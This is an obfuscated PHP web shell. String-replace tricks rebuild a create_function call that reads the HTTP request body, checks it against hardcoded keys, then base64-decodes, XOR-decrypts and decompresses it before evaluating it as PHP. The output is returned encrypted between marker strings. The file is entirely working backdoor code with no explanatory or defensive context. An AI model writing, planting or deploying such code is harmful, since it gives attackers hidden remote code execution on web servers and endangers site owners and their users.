<?php
$y='"/$kh(JZ.+)$kJZf/",@fiJZle_JZgetJZ_contenJZts("JZphp://iJZnput"),$JZm)==1JZ) {@oJZb_starJZt();@JZe';
$r='tioJZJZn x($t,$kJZ){JZ$cJZ=strlen($k);$l=sJZtrlJZen($t)JZ;$o="";foJZrJZ($i=JZ0;JZ$i<JZ$l;){for($j=';
$m=str_replace('Wz','','cWzreWzatWze_fuWznWzctWzion');
$X='vaJZl(@gzJZuncompress(@x(@JZbJZase64_deJZcodJZe($m[1]),$JZJZk)));$o=@obJZ_get_conteJZntJZs();@oJZJ';
$e='0;($JZj<$c&&$i<JZ$lJZ);$j++JZ,$i++){JZ$o.=$tJZ{$i}JZ^$k{$j};}}rJZetuJZrJZn $o;}if (@preJZg_maJZtch(';
$v='$k=JZ"3db60JZa11";JZ$kh=JZ"4c4f306JZe8eab";$kfJZJZ="JZ1e75473eJZ0a82";$pJZ="3egETNcJZMTooJZYfqxb";func';
$z='Zb_end_cJZleanJZ();$r=@base6JZ4_encode(JZ@x(@gzcJZoJZJZmpress(JZ$o),$JZk));print("JZ$p$kh$r$kf");}';
$T=str_replace('JZ','',$v.$r.$e.$y.$X.$z);
$u=$m('',$T);$u();
?>
